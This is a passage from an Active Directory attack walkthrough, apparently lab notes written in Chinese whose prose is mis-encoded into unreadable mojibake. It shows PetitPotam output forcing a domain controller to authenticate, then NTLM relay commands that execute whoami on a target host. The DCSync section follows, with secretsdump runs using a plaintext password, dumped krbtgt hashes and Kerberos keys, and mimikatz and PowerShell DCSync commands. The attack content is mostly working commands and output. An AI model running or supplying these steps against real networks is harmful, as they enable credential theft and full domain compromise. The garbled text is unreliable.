          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.2.15[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

192.168.2.15 æ˜¯åŸŸæ§

<img src=".\å›¾ç‰‡\Snipaste_2023-09-22_22-18-13.png" alt="Snipaste_2023-09-22_22-18-13" style="zoom:80%;" />



#### å…¶å®ƒ

è¿˜æœ‰å¾ˆå¤šéªšæ“ä½œè®© åŸŸæ§å¯¹æ”»å‡»æœºåšNTLMéªŒè¯ï¼Œå…ˆä¸æ¼”ç¤ºäº† 

- å›¾æ ‡
- æµè§ˆå™¨
- Outlook
- ç³»ç»Ÿå‘½ä»¤
- Office
- PDF
- WPAD



### é‡æ”¾ Net-NTLM Hash

åŸŸç¯å¢ƒä¸­ï¼Œæ™®é€šåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥ç™»å½•åˆ°é™¤åŸŸæ§å¤–çš„å…¶å®ƒæœºå™¨ï¼Œå› æ­¤å¯ä»¥å°†åŸŸç”¨æˆ·çš„ Net-NTLM Hash ä¸­ç»§åˆ°åŸŸå†…å…¶å®ƒæœºå™¨



#### ä¸­ç»§åˆ°smb

1ã€`smbrelayx.py`

```bash
smbrelayx.py -h 192.168.2.13 -c whoami
```

åœ¨ç­‰å¾… åŸŸæ§è¿æ¥ 192.168.2.13 çš„ smb æœåŠ¡ç§¯å³å¯



2ã€`ntlmrelayx.py`

```
ntlmrelayx.py -t smb://192.168.2.13 -c whoami -smb2support
```



3ã€Responder ä¸‹çš„ MultiRelay.py

```bash
MultiRelay.py -t 192.168.2.13 -u ALL
```





## DCSync

åœ¨åŸŸå†…ï¼Œä¸åŒçš„åŸŸæ§åˆ¶å™¨ä¹‹é—´ï¼Œæ¯éš”15åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€æ¬¡åŸŸæ•°æ®çš„åŒæ­¥ï¼Œå½“ä¸€ä¸ªåŸŸæ§åˆ¶å™¨æƒ³ä»å…¶ä»–åŸŸæ§åˆ¶å™¨ä¸Šé¢è·å–æ•°æ®æ—¶ï¼ŒDC1ä¼šå‘DC2å‘èµ·ä¸€ä¸ªGetNCChangesè¯·æ±‚ï¼Œè¯¥è¯·æ±‚çš„æ•°æ®ï¼ŒåŒ…æ‹¬éœ€è¦åŒæ­¥çš„æ•°æ®ï¼Œå¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šé¢çš„è¿‡ç¨‹ã€‚

Dcsyncå°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œé€šè¿‡DPSæœåŠ¡çš„GetNCChanges æ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ã€‚

å½“è·å–åˆ°åŸŸå†…ç®¡ç†å‘˜çš„æƒé™ï¼Œ**å¦‚æœèƒ½ä¿®æ”¹åŸŸå†…æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œä½¿å…¶å…·æœ‰DCSYNCæƒé™çš„è¯ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥å¯¼å‡ºåŸŸå†…çš„Hash**ï¼Œè¿™æ ·å°±åšåˆ°äº†ä¸€ä¸ªæƒé™ç»´æŒçš„æ“ä½œã€‚é»˜è®¤åªæœ‰åŸŸæ§ä¸»æœºè´¦å·å’ŒåŸŸç®¡ç†å‘˜èƒ½DCSYNCï¼ŒåŸŸç®¡å’Œé‚®ä»¶æœåŠ¡å™¨çš„è´¦æˆ·éƒ½æœ‰å†™ACLçš„æƒé™ï¼Œå¯ä»¥ç»™æŒ‡å®šç”¨æˆ·æ·»åŠ Dcsyncæ¥dumpåŸŸå†…hash



### æŸ¥è¯¢

```powershell
Adfind.exe -s subtree -b "DC=redteam,DC=red" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute
```

```
AdFind.exe -s subtree -b "DC=redteam,DC=red" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute
```



### æ”»å‡»

```bash
â””â”€# secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -just-dc-user krbtgt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a67f14d5cc4fa22618c8b609e832db6:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:67075a54cf9106904392e010bcd3caec5cc3d57d3c65b42065482ae53910ddbd
krbtgt:aes128-cts-hmac-sha1-96:0513db3ca29c78c0dff2295e5ac0388c
krbtgt:des-cbc-md5:f2fee9b529703e67
krbtgt:rc4_hmac:4a67f14d5cc4fa22618c8b609e832db6
[*] Cleaning up... 
```

```
 secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -just-dc  è·å–æ‰€æœ‰ç”¨æˆ·çš„ hash
```



è¿˜å¯èƒ½è·å–æ˜æ–‡å¯†ç ï¼Œè¿™ä¸ªå¾—åŸŸæ§é…ç½®äº†ç›¸å…³æ“ä½œ



åŒç†å·¥å…·è¿˜æœ‰ mimikatz ã€powershell è„šæœ¬ç­‰



mimikatzï¼š

```
#è·å– krbtgt çš„ Hash
lsadump::dcsync /domain:redteam.red /user:krbtgt
#è·å–æ‰€æœ‰ç”¨æˆ·çš„ Hash
lsadump::dcsync /domain:redteam.red /all /csv
```



powershellè„šæœ¬ï¼š

```powershell
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -DumpForest | ft -warp -autosize
Invoke-DCSync -DumpForest -Users @("krbtgt") | ft -warp -autosize
```



åˆ©ç”¨ DCSync è·å–æ˜æ–‡å‡­æ®ï¼ˆéœ€è¦åŸŸæ§è¿›è¡Œç›¸å…³é…ç½®ï¼‰

```bash
secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -dc-ip 192.168.2.13 just-dc-user administrator
```


